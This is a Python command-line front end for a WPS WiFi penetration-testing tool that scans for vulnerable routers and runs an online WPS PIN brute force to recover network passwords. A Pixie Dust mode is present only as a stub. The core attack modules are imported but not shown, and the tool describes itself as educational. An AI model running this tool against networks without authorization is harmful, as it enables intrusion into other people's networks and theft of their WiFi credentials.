"""FARHAN-Shot CLI - Main command-line interface"""
import typer
from typing import Optional
from pathlib import Path
import logging
import sys

from .core.config import Config, set_config
from .core.logger import setup_logging, get_logger
from .db.database import VulnerabilityDatabase, ResultsDatabase
from .db.models import AttackResult, NetworkTarget
from .scan.scanner import NetworkScanner
from .pins.generator import WPSPinGenerator
from .core.wpa_controller import WPASupplicantController
from .attacks.pixie_dust import PixieDustAttack
from .attacks.bruteforce import PINBruteforce
from .ui.display import FarhanShotUI

app = typer.Typer(
    name="farhan-shot",
    help="Modern WPS WiFi Penetration Testing Tool - Educational Purpose Only",
    add_completion=False
)


@app.command()
def scan(
    interface: str = typer.Option("wlan0", "--interface", "-i", help="WiFi interface name"),
    timeout: int = typer.Option(10, "--timeout", "-t", help="Scan timeout in seconds"),
    verbose: bool = typer.Option(False, "--verbose", "-v", help="Verbose output"),
):
    """Scan for WiFi networks and identify vulnerable targets"""
    # Setup
    config = Config(interface=interface, timeout=timeout, verbose=verbose)
    set_config(config)
    logger = setup_logging(level="DEBUG" if verbose else "INFO", verbose=verbose)
    
    FarhanShotUI.show_banner()
    
    # Initialize databases
    vuln_db = VulnerabilityDatabase(config.vuln_db_path)
    
    # Scan networks
    scanner = NetworkScanner(interface, vuln_db)
    
    with FarhanShotUI.create_progress() as progress:
        task = progress.add_task("[cyan]Scanning networks...", total=None)
        targets = scanner.scan(timeout=timeout)
        progress.update(task, completed=100)
    
    if not targets:
        FarhanShotUI.show_warning("No networks found")
        return
    
    # Display results
    FarhanShotUI.show_targets(targets)
    
    # Show vulnerable targets
    vuln_targets = scanner.get_vulnerable_targets(min_score=0.5)
    if vuln_targets:
        FarhanShotUI.show_info(f"\nFound {len(vuln_targets)} highly vulnerable targets!")


@app.command()
def attack(
    interface: str = typer.Option("wlan0", "--interface", "-i", help="WiFi interface name"),
    bssid: Optional[str] = typer.Option(None, "--bssid", "-b", help="Target BSSID"),
    attack_type: str = typer.Option("auto", "--type", "-t", help="Attack type: pixie, bruteforce, auto"),
    max_pins: int = typer.Option(20, "--max-pins", "-m", help="Maximum PINs to try"),
    verbose: bool = typer.Option(False, "--verbose", "-v", help="Verbose output"),
):
    """Perform WPS attack on target network"""
    # Setup
    config = Config(interface=interface, verbose=verbose, max_pin_attempts=max_pins)
    set_config(config)
    logger = setup_logging(level="DEBUG" if verbose else "INFO", verbose=verbose)
    
    FarhanShotUI.show_banner()
    
    if not bssid:
        FarhanShotUI.show_error("BSSID is required. Use --bssid or -b option")
        FarhanShotUI.show_info("Run 'farhan-shot scan' to find targets")
        return
    
    # Initialize components
    vuln_db = VulnerabilityDatabase(config.vuln_db_path)
    results_db = ResultsDatabase(config.results_dir)
    pin_gen = WPSPinGenerator()
    wpa = WPASupplicantController(interface)
    
    # Create target (simplified - would normally come from scan)
    target = NetworkTarget(
        ssid="Target",
        bssid=bssid,
        channel=0,
        signal_strength=-50,
        encryption="WPA2",
        wps_enabled=True,
        wps_locked=False
    )
    
    # Enrich with vulnerability data
    vuln_router = vuln_db.lookup(bssid)
    if vuln_router:
        target.manufacturer = vuln_router.manufacturer
        target.vulnerability_score = vuln_db.get_vulnerability_score(bssid)
    
    FarhanShotUI.show_attack_start(target, attack_type)
    
    # Generate PINs
    FarhanShotUI.show_info("Generating PIN candidates...")
    pins = pin_gen.get_suggested_pins(bssid, max_pins=max_pins)
    FarhanShotUI.show_info(f"Generated {len(pins)} PIN candidates")
    
    # Perform attack
    if attack_type in ["auto", "bruteforce"]:
        FarhanShotUI.show_info("Starting online bruteforce attack...")
        
        # Start WPA supplicant
        if not wpa.start():
            FarhanShotUI.show_error("Failed to start wpa_supplicant. Root access required.")
            return
        
        try:
            bruteforce = PINBruteforce(wpa, delay=config.bruteforce_delay, max_attempts=max_pins)
            
            def progress_callback(current, total, pin):
                logger.info(f"Trying PIN {current}/{total}: {pin}")
            
            with FarhanShotUI.create_progress() as progress:
                task = progress.add_task(f"[cyan]Testing PINs...", total=len(pins))
                
                result = bruteforce.attack_online(bssid, pins, progress_callback)
                
                progress.update(task, completed=len(pins))
            
            # Show result
            if result.success:
                attack_result = AttackResult(
                    target_ssid=target.ssid,
                    target_bssid=bssid,
                    attack_type="bruteforce",
                    success=True,
                    pin=result.pin,
                    password=result.password,
                    duration=result.duration,
                    pins_tried=result.pins_tried
                )
                FarhanShotUI.show_success(attack_result)
                results_db.save_result(attack_result)
            else:
                attack_result = AttackResult(
                    target_ssid=target.ssid,
                    target_bssid=bssid,
                    attack_type="bruteforce",
                    success=False,
                    duration=result.duration,
                    pins_tried=result.pins_tried,
                    error_message=result.error
                )
                FarhanShotUI.show_failure(attack_result)
                results_db.save_result(attack_result)
        
        finally:
            wpa.stop()
            wpa.cleanup()
    
    elif attack_type == "pixie":
        FarhanShotUI.show_warning("Pixie Dust attack requires root access and proper setup")
        FarhanShotUI.show_info("This feature is for demonstration purposes")


@app.command()
def info():
    """Show tool information and statistics"""
    FarhanShotUI.show_banner()
    
    config = Config()
    
    # Load databases
    vuln_db = VulnerabilityDatabase(config.vuln_db_path)
    results_db = ResultsDatabase(config.results_dir)
    
    # Show database stats
    vuln_stats = vuln_db.get_stats()
    results_stats = results_db.get_stats()
    
    FarhanShotUI.show_info(f"Vulnerability Database: {vuln_stats['total_entries']} entries")
    FarhanShotUI.show_info(f"Manufacturers Covered: {vuln_stats['manufacturers']}")
    FarhanShotUI.show_info(f"\nPrevious Attacks: {results_stats['total']}")
    FarhanShotUI.show_info(f"Successful: {results_stats['successful']}")
    if results_stats['total'] > 0:
        FarhanShotUI.show_info(f"Success Rate: {results_stats['success_rate']:.1f}%")


@app.command()
def version():
    """Show version information"""
    FarhanShotUI.show_banner()
    print("\nVersion: 2.0.0")
    print("Modern WPS Penetration Testing Tool")
    print("For educational and authorized testing only")


def main():
    """Main entry point"""
    try:
        app()
    except KeyboardInterrupt:
        print("\n[bold yellow]Interrupted by user[/]")
        sys.exit(0)
    except Exception as e:
        print(f"\n[bold red]Error: {e}[/]")
        sys.exit(1)


if __name__ == "__main__":
    main()
